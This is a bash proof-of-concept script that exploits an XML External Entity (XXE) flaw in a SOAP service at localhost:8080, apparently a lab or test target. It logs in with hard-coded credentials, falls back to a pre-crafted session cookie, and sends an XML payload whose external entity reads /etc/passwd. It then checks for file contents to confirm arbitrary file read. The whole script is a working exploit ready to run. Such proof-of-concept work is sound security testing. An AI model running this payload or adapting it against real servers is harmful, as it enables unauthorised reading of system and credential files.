#!/bin/bash

# POC: XML External Entity (XXE) Injection in SOAP Service
# This POC demonstrates XXE vulnerability in /soap_service endpoint

echo "=========================================="
echo "XXE Injection POC - SOAP Service"
echo "=========================================="
echo ""

TARGET_URL="http://localhost:8080"
SOAP_ENDPOINT="${TARGET_URL}/soap_service"

# First, we need to get a valid session cookie by logging in
echo "[*] Step 1: Authenticating to get session cookie..."
LOGIN_RESPONSE=$(curl -s -c /tmp/xxe_cookies.txt -X POST "${TARGET_URL}/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)

if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "[+] Authentication successful (HTTP $HTTP_CODE)"
else
    echo "[-] Authentication failed (HTTP $HTTP_CODE)"
    echo "[*] Trying with a pre-crafted session cookie instead..."
    echo "localhost:8080	FALSE	/	FALSE	0	session	eyJ1c2VybmFtZSI6ImpvaG4ifQ.aQToyA.Rgpfub5uj999-V1fH-a5lPbu0l8" > /tmp/xxe_cookies.txt
fi

echo ""
echo "[*] Step 2: Sending XXE payload to read /etc/passwd..."
echo ""

# XXE payload to read /etc/passwd
XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>'

echo "[*] Payload:"
echo "$XXE_PAYLOAD"
echo ""

# Send the malicious SOAP request
echo "[*] Sending request to ${SOAP_ENDPOINT}..."
RESPONSE=$(curl -s -b /tmp/xxe_cookies.txt -X POST "$SOAP_ENDPOINT" \
  -H "Content-Type: application/xml" \
  -d "$XXE_PAYLOAD" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | grep -v "HTTP_CODE:")

echo "[*] Response (HTTP $HTTP_CODE):"
echo "$BODY"
echo ""

# Check if /etc/passwd content is in the response
if echo "$BODY" | grep -q "root:"; then
    echo "[+] SUCCESS! XXE vulnerability confirmed!"
    echo "[+] Successfully read /etc/passwd file content"
    echo ""
    echo "[!] IMPACT: Arbitrary file read on the server filesystem"
    echo "[!] SEVERITY: CRITICAL"
else
    echo "[-] XXE exploitation failed or /etc/passwd not in response"
    echo "[*] Response body:"
    echo "$BODY"
fi

# Cleanup
rm -f /tmp/xxe_cookies.txt

echo ""
echo "=========================================="
echo "POC Complete"
echo "=========================================="